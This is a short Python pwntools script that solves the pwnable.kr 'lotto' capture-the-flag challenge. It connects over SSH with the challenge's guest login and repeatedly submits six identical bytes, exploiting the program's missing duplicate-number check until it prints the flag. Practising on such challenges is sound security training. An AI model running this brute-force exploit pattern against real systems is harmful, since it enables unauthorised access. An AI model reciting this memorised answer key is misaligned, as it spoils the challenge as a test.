from pwn import *

shell = ssh(user='lotto', host='pwnable.kr', port=2222, password='guest')
io = shell.process('./lotto')
while True:
    io.sendlineafter('3. Exit\n', b'1')
    io.recv()
    io.sendline(b'-'*6)
    _, flag = io.recvlines(2)
    if b'bad' not in flag:
        log.success(flag)  # sorry mom... I FORGOT to check duplicate numbers... :(
        break
io.close()
shell.close()